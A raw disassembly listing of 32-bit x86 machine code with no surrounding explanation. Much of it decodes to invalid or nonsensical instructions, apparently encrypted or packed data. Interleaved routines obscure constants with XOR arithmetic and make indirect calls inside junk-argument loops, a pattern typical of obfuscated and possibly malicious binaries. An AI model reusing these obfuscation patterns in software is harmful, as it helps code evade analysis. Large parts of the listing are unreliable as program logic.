  4041e9:	or     ebx,eax
  4041eb:	adc    al,0xbe
  4041ed:	outs   dx,BYTE PTR ds:[esi]
  4041ee:	mov    ah,ch
  4041f0:	xlat   BYTE PTR ds:[ebx]
  4041f1:	dec    ebp
  4041f2:	stc    
  4041f3:	dec    ecx
  4041f4:	xchg   ebp,esi
  4041f6:	dec    ecx
  4041f7:	out    0xb0,al
  4041f9:	pop    esi
  4041fa:	inc    ebx
  4041fb:	aaa    
  4041fc:	in     eax,0x59
  4041fe:	add    eax,0xa454ab56
  404203:	and    al,0x9f
  404205:	aas    
  404206:	xor    eax,0x3c2e54dd
  40420b:	(bad)  
  40420c:	clc    
  40420d:	xor    ebx,ecx
  40420f:	mov    ebx,fs
  404211:	sub    eax,0xfb62f0f3
  404216:	adc    DWORD PTR [ecx+0x6a],ebx
  404219:	nop
  40421a:	inc    eax
  40421b:	inc    ecx
  40421c:	and    ebp,DWORD PTR [eax]
  40421e:	dec    ebx
  40421f:	dec    edx
  404220:	mov    al,ds:0x353a4f91
  404225:	clc    
  404226:	cmp    DWORD PTR [edi+0x40],0x46fe0fe6
  40422d:	and    eax,0x7d8447ef
  404232:	xchg   BYTE PTR [esi],al
  404234:	call   0x3b52d45f
  404239:	dec    edi
  40423a:	mov    BYTE PTR [edi],dh
  40423c:	out    dx,eax
  40423d:	cdq    
  40423e:	popf   
  40423f:	mov    ebp,0x9b026d9e
  404244:	fisttp WORD PTR [ecx+0x4c44935]
  40424a:	repz pop edx
  40424c:	jbe    0x404227
  40424e:	lock sub al,0xe2
  404251:	nop
  404252:	jecxz  0x404260
  404254:	mov    al,0x1e
  404256:	(bad)  
  404257:	lds    edi,FWORD PTR [esi-0x4a]
  40425a:	push   esp
  40425b:	add    bl,dh
  40425d:	fst    QWORD PTR [ebp+0x1e]
  404260:	or     bl,BYTE PTR [edi-0x30dfbfcb]
  404266:	imul   edi,DWORD PTR [ebp+0x6059f67],0x7e6ff64a
  404270:	in     al,0x43
  404272:	pop    edi
  404273:	fst    QWORD PTR [ebx]
  404275:	in     al,dx
  404276:	jle    0x40428d
  404278:	aaa    
  404279:	dec    ecx
  40427a:	xor    DWORD PTR [esp+edx*4],edx
  40427d:	mov    al,0x94
  40427f:	xchg   esi,eax
  404280:	(bad)  
  404281:	cdq    
  404282:	mov    ecx,0x4a87b647
  404287:	push   ebp
  404288:	dec    esi
  404289:	pop    ss
  40428a:	jnp    0x404230
  40428c:	jae    0x4042dd
  40428e:	aam    0xe5
  404290:	retf   
  404291:	mov    esp,0xf03fc38f
  404296:	push   ecx
  404297:	in     al,0x9
  404299:	imul   ebp,DWORD PTR [edx],0x4b3d562c
  40429f:	bnd jp 0x4042e6
  4042a2:	adc    al,0x14
  4042a4:	mov    al,0x8
  4042a6:	shl    esp,0x91
  4042a9:	pop    ebx
  4042aa:	mov    bl,BYTE PTR [ebp-0x1134681e]
  4042b0:	ins    BYTE PTR es:[edi],dx
  4042b1:	xchg   ecx,eax
  4042b2:	sub    bl,ch
  4042b4:	or     edx,DWORD PTR [ebp-0x6b]
  4042b7:	adc    DWORD PTR gs:[eax+0x12885064],edi
  4042be:	imul   eax,ecx,0x836722a
  4042c4:	mov    ?,WORD PTR [esi+0x5fcadd2c]
  4042ca:	mov    BYTE PTR [ecx-0x36],al
  4042cd:	lods   eax,DWORD PTR ds:[esi]
  4042ce:	jne    0x404312
  4042d0:	push   ebp
  4042d1:	jae    0x40430f
  4042d3:	dec    BYTE PTR [eax+0x41]
  4042d6:	sub    eax,0x775fc722
  4042db:	push   ecx
  4042dc:	adc    eax,0x422007eb
  4042e1:	rol    dl,cl
  4042e3:	lods   eax,DWORD PTR ds:[esi]
  4042e4:	addr16 mov ebp,0x42d61747
  4042ea:	mov    edi,0xc9ced816
  4042ef:	and    ebx,DWORD PTR [ebp-0x2c]
  4042f2:	ins    BYTE PTR es:[edi],dx
  4042f3:	dec    esp
  4042f4:	or     DWORD PTR [ebp+0x5b],edx
  4042f7:	sbb    eax,DWORD PTR [ecx+eiz*1+0x1d]
  4042fb:	inc    ebp
  4042fc:	xchg   BYTE PTR [ebx-0x23a6bff2],dl
  404302:	xor    BYTE PTR [ebx-0x79],0x81
  404306:	inc    ebp
  404307:	pop    ss
  404308:	ret    
  404309:	scas   eax,DWORD PTR es:[edi]
  40430a:	fisttp DWORD PTR [edi+0x7be22cb6]
  404310:	data16 sub BYTE PTR [ebx-0x27],bh
  404314:	sub    eax,0x5927462d
  404319:	fisttp DWORD PTR [ebp+0x5]
  40431c:	push   edi
  40431d:	push   ebp
  40431e:	mov    ecx,eax
  404320:	stc    
  404321:	xadd   DWORD PTR [esi+0x66],ecx
  404325:	popf   
  404326:	sub    eax,0xa7b3d9ad
  40432b:	xor    al,0xb4
  40432d:	sub    BYTE PTR [ecx+0x1f],bh
  404330:	sbb    al,0xcb
  404332:	scas   al,BYTE PTR es:[edi]
  404333:	jb     0x404319
  404335:	mov    DWORD PTR [ecx+0x56],esp
  404338:	xchg   ebp,eax
  404339:	push   es
  40433a:	sub    al,0xd6
  40433c:	jae    0x404361
  40433e:	clc    
  40433f:	std    
  404340:	xchg   ebx,eax
  404341:	std    
  404342:	fisubr DWORD PTR [ebx+0x50]
  404345:	ror    cl,0x6c
  404348:	sub    eax,DWORD PTR [esi+edi*1-0x63]
  40434c:	(bad)  
  40434d:	inc    BYTE PTR [esi+0x33]
  404350:	mov    bl,0x1
  404352:	xlat   BYTE PTR ds:[ebx]
  404353:	add    cl,BYTE PTR [eax]
  404355:	and    eax,0xcb0d6b6a
  40435a:	mov    al,ds:0x801c1c4d
  40435f:	pop    esp
  404360:	repnz div esi
  404363:	(bad)  
  404364:	mov    esp,0x7de24b2c
  404369:	push   esp
  40436a:	std    
  40436b:	and    ecx,DWORD PTR [ebx]
  40436d:	mul    DWORD PTR [eax-0x4ce61c7a]
  404373:	retf   
  404374:	scas   eax,DWORD PTR es:[edi]
  404375:	pop    es
  404376:	push   cs
  404377:	mov    bh,0x1c
  404379:	in     al,dx
  40437a:	sahf   
  40437b:	push   es
  40437c:	into   
  40437d:	fld    TBYTE PTR [ecx-0x4b]
  404380:	jg     0x4043ce
  404382:	ror    bh,1
  404384:	ret    
  404385:	repz dec eax
  404387:	pop    ss
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42edef,0x42e7c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ede7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430435,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42edef,0x430435
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4304df,0x42e7c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e7cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ede3,0x42edeb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42edeb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43044d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	push   0xfd5ef1e2
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x40441d
  404439:	push   edx
  40443a:	push   edi
  40443b:	nop
  40443c:	mov    BYTE PTR [ebx+0x1c1105e6],bh
  404442:	adc    edi,esi
  404444:	not    al
  404446:	dec    esi
  404447:	mov    eax,DWORD PTR [ebp-0xf]
  40444a:	loope  0x4043dc
  40444c:	arpl   bx,di
  40444e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40444f:	test   BYTE PTR [ebx],al
  404451:	fisub  WORD PTR [eax-0x64]
  404454:	inc    edi
  404455:	pop    es
  404456:	mov    eax,0x3696de76
  40445b:	adc    DWORD PTR [ecx-0x25f7d1b4],ecx
  404461:	sar    ch,0xc
  404464:	(bad)  
  404465:	iret   
  404466:	mov    dh,0xd3
  404468:	mov    cl,0xf
  40446a:	out    dx,al
  40446b:	and    dl,BYTE PTR [ecx-0x74ad7af1]
  404471:	or     bl,BYTE PTR [ebx-0x3c19bee1]
  404477:	int3   
  404478:	shl    dh,cl
  40447a:	xchg   edi,eax
  40447b:	sbb    BYTE PTR [ecx+0x31],0x3c
  40447f:	call   FWORD PTR [ebx]
  404481:	add    cl,BYTE PTR [eax-0x2c23451b]
  404487:	sar    BYTE PTR [ebp+0x31],0xc8
  40448b:	popa   
  40448c:	pop    edi
  40448d:	lods   al,BYTE PTR ds:[esi]
  40448e:	inc    ecx
  40448f:	loopne 0x40442c
  404491:	or     al,0xd2
  404493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404494:	int    0xb7
  404496:	shl    DWORD PTR [esi-0x6],0x19
  40449a:	jge    0x4044ac
  40449c:	leave  
  40449d:	jp     0x404430
  40449f:	leave  
  4044a0:	add    ecx,DWORD PTR ds:0xbfbcf820
  4044a6:	mov    esp,0x36ce0b37
  4044ab:	xor    BYTE PTR [edi+0x3a],0x0
  4044af:	xchg   esp,eax
  4044b0:	hlt    
  4044b1:	dec    esp
  4044b2:	pop    ebp
  4044b3:	retf   
  4044b4:	cmp    al,0x81
  4044b6:	sti    
  4044b7:	test   al,0xce
  4044b9:	pop    esi
  4044ba:	sbb    bh,al
  4044bc:	jns    0x4044a5
  4044be:	fst    DWORD PTR [esi+0x51]
  4044c1:	sbb    dl,0x80
  4044c4:	xchg   edx,ebp
  4044c6:	mov    esi,0x20240c67
  4044cb:	lods   eax,DWORD PTR ds:[esi]
  4044cc:	xchg   edx,eax
  4044cd:	bound  esp,QWORD PTR [ecx+eiz*8]
  4044d0:	(bad)  
  4044d1:	or     eax,0xdddcfdd
  4044d6:	inc    ecx
  4044d7:	or     ecx,DWORD PTR [ebx+esi*1-0x6ff9044a]
  4044de:	(bad)  
  4044df:	push   edx
  4044e0:	ja     0x404532
  4044e2:	int    0xab
  4044e4:	outs   dx,BYTE PTR ds:[esi]
  4044e5:	arpl   bx,dx
  4044e7:	mov    ds:0x7b1544e9,eax
  4044ec:	fild   DWORD PTR [eax+0x5]
  4044ef:	push   cs
  4044f0:	into   
  4044f1:	stc    
  4044f2:	aas    
  4044f3:	pop    ebp
  4044f4:	imul   eax,DWORD PTR [esp+edi*1+0x2d7bcc61],0xffffff8c
  4044fc:	or     DWORD PTR ds:0x48b374ae,ecx
  404502:	cmp    esp,DWORD PTR [ebx+0x62]
  404505:	xor    ch,ah
  404507:	pop    es
  404508:	stos   DWORD PTR es:[edi],eax
  404509:	jbe    0x404561
  40450b:	mov    WORD PTR [ebx],?
  40450d:	fs push ebx
  40450f:	bswap  esi
  404511:	jne    0x40452d
  404513:	xchg   ebx,eax
  404514:	pusha  
  404515:	shl    BYTE PTR [edi+0x7b570391],1
  40451b:	or     ch,BYTE PTR [ecx]
  40451d:	xchg   ecx,eax
  40451e:	ret    
  40451f:	push   esi
  404520:	ds jae 0x4044fb
  404523:	or     ch,bl
  404525:	idiv   BYTE PTR [edx-0x35]
  404528:	test   BYTE PTR [ebx+0x2432b84f],ch
  40452e:	gs cmp al,0xec
  404531:	cld    
  404532:	icebp  
  404533:	jecxz  0x404521
  404535:	dec    edx
  404536:	mov    cl,0xcd
  404538:	ds pop ebx
  40453a:	xchg   ebx,eax
  40453b:	loope  0x404520
  40453d:	dec    esp
  40453e:	mov    BYTE PTR [ebp+0x22],bl
  404541:	loop   0x404533
  404543:	xor    al,0x3f
  404545:	call   DWORD PTR [edi]
  404547:	mov    bl,0x9c
  404549:	mov    ch,0x8d
  40454b:	cli    
  40454c:	ret    0x6807
  40454f:	fidiv  DWORD PTR [ebx-0x25]
  404552:	inc    ebp
  404553:	enter  0x897f,0xcc
  404557:	imul   esi,DWORD PTR [eax-0x76],0x149a89e7
  40455e:	ins    BYTE PTR es:[edi],dx
  40455f:	mov    cl,0x95
  404561:	pop    esp
  404562:	push   eax
  404563:	es call 0x3e7a:0x7d99dca3
  40456b:	cli    
  40456c:	clc    
  40456d:	adc    BYTE PTR [edx-0x72],ch
  404570:	loope  0x404551
  404572:	in     al,dx
  404573:	jno    0x404558
  404575:	sbb    esi,0x48
  404578:	push   cs
  404579:	mov    dl,0x98
  40457b:	mov    ebx,0xc4d1bc3
  404580:	adc    bl,BYTE PTR [edx+edx*1]
  404583:	jbe    0x4045c6
  404585:	xor    al,0x84
  404587:	jb     0x4045b1
  404589:	fstp   QWORD PTR [eax-0x2444ba81]
  40458f:	mov    dl,0xb1
  404591:	das    
  404592:	add    eax,0x24a87b78
  404597:	push   eax
  404598:	cs mov eax,0xb3d2915c
  40459e:	inc    ebp
  40459f:	sbb    eax,DWORD PTR [ebp-0x42d5fb35]
  4045a5:	(bad)  
  4045a6:	adc    al,0xda
  4045a8:	xchg   dl,ah
  4045aa:	adc    edx,edx
  4045ac:	dec    esp
  4045ad:	xchg   DWORD PTR [esi-0x38f9df0e],edx
  4045b3:	cmp    DWORD PTR [edi+0x46],esi
  4045b6:	hlt    
  4045b7:	cli    
  4045b8:	cli    
  4045b9:	jnp    0x4045fd
  4045bb:	dec    esi
  4045bc:	fist   DWORD PTR [edx-0x6d5e63e8]
  4045c2:	or     DWORD PTR [edi],ebp
  4045c4:	fmul   QWORD PTR [ecx-0x31]
  4045c7:	add    al,0xfe
  4045c9:	lahf   
  4045ca:	dec    eax
  4045cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045cc:	jns    0x4045ef
  4045ce:	pop    ds
  4045cf:	sbb    bl,cl
  4045d1:	in     eax,0x26
  4045d3:	(bad)  
  4045d4:	fdiv   DWORD PTR ds:0x191ccbfd
  4045da:	mov    ch,0x92
  4045dc:	inc    ebx
  4045dd:	data16 in al,0x3
  4045e0:	rol    DWORD PTR [ebx],0xf1
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4304e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430439,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430439
  40460c:	inc    eax
  40460d:	mov    ds:0x430439,eax
  404612:	cmp    DWORD PTR ds:0x430439,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430439,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ec13
  404650:	cmp    DWORD PTR ds:0x430439,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430439
  404662:	inc    eax
  404663:	mov    ds:0x430439,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42edd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430439,0x430471
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43045d,0x42eddb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x40473f
  4046fa:	stos   DWORD PTR es:[edi],eax
  4046fb:	pushf  
  4046fc:	(bad)  
  4046fe:	daa    
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046f8
  404706:	push   ebp
  404707:	sbb    ecx,DWORD PTR [esi+0x330a9894]
  40470d:	mov    ds:0x64384a1f,al
  404712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404713:	pop    ds
  404714:	lds    esp,FWORD PTR [edi+0x6e]
  404717:	sti    
  404718:	sbb    ch,cl
  40471a:	fldcw  WORD PTR [edx-0x2f]
  40471d:	ja     0x404767
  40471f:	mov    eax,ds:0x4b9ba1cc
  404724:	out    dx,al
  404725:	and    eax,0x951c37a4
  40472a:	dec    edx
  40472b:	cdq    
  40472c:	xor    edx,DWORD PTR [ecx+0x77]
  40472f:	mov    dh,0x9e
  404731:	mov    al,0xad
  404733:	mov    eax,ds:0x7994a513
  404738:	nop
  404739:	std    
  40473a:	cmp    edx,0xffffffe1
  40473d:	add    eax,DWORD PTR [ebp+0x10]
  404740:	sbb    al,0x19
  404742:	pop    DWORD PTR [ecx-0x54]
  404745:	call   0x9cb5:0x8705aad1
  40474c:	xchg   ecx,eax
  40474d:	retf   
  40474e:	and    ecx,esp
  404750:	and    bh,BYTE PTR [eax-0x526afe6e]
  404756:	xor    DWORD PTR [ebx+eiz*1+0x28],ebx
  40475a:	jbe    0x4046f5
  40475c:	(bad)  
  40475d:	call   0x27b81171
  404762:	inc    eax
  404763:	in     eax,0x47
  404765:	mov    dh,0x89
  404767:	int    0xd4
  404769:	ret    
  40476a:	and    esi,edi
  40476c:	push   edi
  40476d:	mov    edx,0x71822352
  404772:	cmp    eax,0x522c0301
  404777:	push   esp
  404778:	ins    BYTE PTR es:[edi],dx
  404779:	adc    eax,DWORD PTR [ebx]
  40477b:	jmp    0x23b45629
  404780:	push   ss
  404781:	xor    DWORD PTR [ebx+esi*1-0x23],0xd4fef605
  404789:	es pusha 
  40478b:	cmp    bh,BYTE PTR [edx-0x54cec867]
  404791:	push   esp
  404792:	xchg   edi,eax
  404793:	sub    DWORD PTR [edx],edx
  404795:	dec    eax
  404796:	and    DWORD PTR [ebx],0xd294f27f
  40479c:	inc    esp
  40479d:	jg     0x4047e9
  40479f:	add    cl,bh
  4047a1:	arpl   WORD PTR [ebx],bp
  4047a3:	ss jne 0x4047f5
  4047a6:	imul   eax,DWORD PTR [eax-0x20],0xffffffed
  4047aa:	ja     0x4047b3
  4047ac:	dec    ebp
  4047ad:	push   ecx
  4047ae:	es push cs
  4047b0:	pop    esi
  4047b1:	into   
  4047b2:	mov    al,ds:0x8e857f2e
  4047b7:	test   eax,0x96f2da43
  4047bc:	aaa    
  4047bd:	xchg   ecx,eax
  4047be:	pop    esi
  4047bf:	jmp    0x40481a
  4047c1:	(bad)  
  4047c2:	outs   dx,DWORD PTR ds:[esi]
  4047c3:	mov    BYTE PTR [edi],cl
  4047c5:	inc    eax
  4047c6:	add    DWORD PTR [ebx-0x6e3df421],edx
  4047cc:	jp     0x4047ca
  4047ce:	cli    
  4047cf:	add    cl,BYTE PTR [ebx-0x3]
  4047d2:	loop   0x40483a
  4047d4:	sub    ebp,edi
  4047d6:	sub    DWORD PTR [ebx+0x1f],eax
  4047d9:	jne    0x4047e8
  4047db:	sti    
  4047dc:	dec    esp
  4047dd:	call   0x76989684
  4047e2:	in     eax,dx
  4047e3:	outs   dx,DWORD PTR ds:[esi]
  4047e4:	lods   eax,DWORD PTR ds:[esi]
  4047e5:	mov    DWORD PTR [eax+0x20],eax
  4047e8:	pcmpgtw mm7,QWORD PTR [edi-0x4c22ebaa]
  4047ef:	adc    eax,0x4987a54c
  4047f4:	call   0x916e:0xfab60c46
  4047fb:	loop   0x40485b
  4047fd:	jg     0x40483d
  4047ff:	sbb    al,0x9e
  404801:	leave  
  404802:	test   BYTE PTR [eax+0x3db4121d],0x6d
  404809:	and    al,0x43
  40480b:	and    esp,edi
  40480d:	push   cs
  40480e:	pusha  
  40480f:	ins    DWORD PTR es:[edi],dx
  404810:	inc    eax
  404811:	cdq    
  404812:	test   esi,ecx
  404814:	mov    ecx,0x7cb6a9a5
  404819:	sub    DWORD PTR ds:0x9027c44a,edx
  40481f:	mov    ds:0x72891c6e,eax
  404824:	dec    eax
  404825:	push   esi
  404826:	sbb    DWORD PTR [ecx-0x75],0x21f5677e
  40482d:	call   0x79c3ec5c
  404832:	adc    BYTE PTR [ebp+0x39],cl
  404835:	mov    ecx,0xc7c28d9e
  40483a:	jmp    0x669f10e6
  40483f:	pop    esp
  404840:	fcmovu st,st(7)
  404842:	aas    
  404843:	xchg   DWORD PTR [esi+0x68],esi
  404846:	cli    
  404847:	scas   eax,DWORD PTR es:[edi]
  404848:	lods   eax,DWORD PTR ds:[esi]
  404849:	jmp    0x4047f1
  40484b:	cmc    
  40484c:	adc    eax,0xeeba513b
  404851:	in     al,dx
  404852:	rcl    WORD PTR [edx],cl
  404855:	and    al,0xb6
  404857:	popf   
  404858:	call   DWORD PTR [esi+0x257fe9a1]
  40485e:	sbb    ch,dl
  404860:	or     BYTE PTR [ebx-0x629e593e],cl
  404866:	rol    DWORD PTR [ecx],cl
  404868:	popf   
  404869:	test   al,0xf6
  40486b:	or     al,0xc1
  40486d:	dec    edx
  40486e:	jmp    0x588e42e0
  404873:	das    
  404874:	inc    ebp
  404875:	mov    ah,0x4e
  404877:	nop
  404878:	inc    ebp
  404879:	retf   
  40487a:	int3   
  40487b:	int    0xc1
  40487d:	jne    0x404882
  40487f:	(bad)  
  404881:	pop    edi
  404882:	stc    
  404883:	sbb    DWORD PTR ds:0x33436253,ebp
  404889:	push   esi
  40488a:	jge    0x404824
  40488c:	lods   al,BYTE PTR ds:[esi]
  40488d:	popf   
  40488e:	sbb    edi,DWORD PTR [ecx+0x7efcaeac]
  404894:	fdiv   DWORD PTR [ebp-0x201fc28]
  40489a:	sbb    BYTE PTR [ebx+0x0],bl
  40489d:	inc    edx
  40489e:	stos   DWORD PTR es:[edi],eax
  40489f:	and    al,0xe4
  4048a1:	mov    ds:0xf83135d7,eax
  4048a6:	nop
  4048a7:	add    al,BYTE PTR [ebp+0x19e1c38d]
  4048ad:	add    BYTE PTR [ebp+0x4d],0xe0
  4048b1:	push   ebx
  4048b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b4:	adc    bh,BYTE PTR ss:[esi+0x6a]
  4048b8:	(bad)  
  4048b9:	adc    eax,0x5bc38635
  4048be:	xor    BYTE PTR [eax-0x18],al
  4048c1:	(bad)  
  4048c2:	xlat   BYTE PTR ds:[ebx]
  4048c3:	add    DWORD PTR [edx-0x80],esp
  4048c6:	mov    al,ds:0x86c3283d
  4048cb:	stos   DWORD PTR es:[edi],eax
  4048cc:	mul    DWORD PTR [ebx-0x4659b465]
  4048d2:	xchg   esi,eax
  4048d3:	out    dx,al
  4048d4:	mov    ch,0x82
  4048d6:	mov    al,ds:0x694ae457
  4048db:	add    BYTE PTR [eax+0x7af12f30],ah
  4048e1:	xchg   esi,eax
  4048e2:	mul    ebx
  4048e4:	mul    DWORD PTR [eax-0x424ca9f9]
  4048ea:	and    ah,BYTE PTR [ebp+0x67475d15]
  4048f0:	add    DWORD PTR [edi+0x3],0xc6c01f6d
  4048f7:	loop   0x404879
  4048f9:	cs not cl
  4048fc:	mov    al,ds:0xd1ae230e
  404901:	leave  
  404902:	retf   0x9d5f
  404905:	dec    edx
  404906:	pop    ds
  404907:	lea    ecx,[esi-0x23]
  40490a:	fsub   st,st(2)
  40490c:	inc    ebp
  40490d:	call   0xa4fb:0x378e9fe9
  404914:	test   al,0x43
  404916:	adc    edi,DWORD PTR [edx-0x4a666d6e]
  40491c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40491d:	ficomp WORD PTR [ebx+0x13]
  404920:	inc    edi
  404921:	lods   eax,DWORD PTR ds:[esi]
  404922:	aam    0x1f
  404924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404925:	push   0x60b6d03f
  40492a:	xor    eax,0x3616b600
  40492f:	ins    DWORD PTR es:[edi],dx
  404930:	mov    dh,BYTE PTR [esp+esi*1+0x25]
  404934:	mov    edi,0xf373937e
  404939:	aad    0xc1
  40493b:	mov    ds:0x60bd8aa4,eax
  404940:	not    BYTE PTR [edi+0x69]
  404943:	pop    esp
  404944:	dec    esp
  404945:	jmp    0xdb51:0x5965c793
  40494c:	fnsave [ebx]
  40494e:	dec    BYTE PTR [ecx]
  404950:	sahf   
  404951:	repnz or edi,DWORD PTR [ebx+0x27ac08d7]
  404958:	dec    ebx
  404959:	out    dx,eax
  40495a:	cli    
  40495b:	into   
  40495c:	loopne 0x404967
  40495e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40495f:	jns    0x4049b5
  404961:	aad    0x87
  404963:	test   DWORD PTR [esi],0xf56dfce7
  404969:	pop    es
  40496a:	cs (bad) 
  40496c:	adc    eax,0x22018840
  404971:	and    eax,DWORD PTR [esi+0x6c]
  404974:	xor    ch,ah
  404976:	xlat   BYTE PTR ds:[ebx]
  404977:	outs   dx,BYTE PTR ds:[esi]
  404978:	sub    BYTE PTR [eax+0x3e],dh
  40497b:	fcomip st,st(3)
  40497d:	lods   eax,DWORD PTR ds:[esi]
  40497e:	pop    eax
  40497f:	leave  
  404980:	mov    al,ds:0xd57438a1
  404985:	js     0x40498d
  404987:	push   eax
  404988:	xchg   DWORD PTR [edx-0x6fbe74a2],edx
  40498e:	jb     0x40492f
  404990:	cdq    
  404991:	sbb    DWORD PTR [edx-0x3cd7b7d],eax
  404997:	int3   
  404998:	ret    0x25da
  40499b:	mov    eax,0xe535606e
  4049a0:	xor    al,0xcb
  4049a2:	fld    TBYTE PTR [ecx+ecx*4-0x27da7efe]
  4049a9:	out    0x42,eax
  4049ab:	add    BYTE PTR [eax],al
  4049ad:	add    BYTE PTR [eax],al
  4049af:	add    BYTE PTR [ebx],dh
  4049b1:	shl    BYTE PTR [ebx],cl
  4049b3:	adc    eax,0x42e7d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e7d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e7d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e9cf
  4049da:	cmp    DWORD PTR ds:0x42e7d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e7d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e7d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e7d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42edeb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4304cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ede7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4304e3,0x4304df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ede7,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4304db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
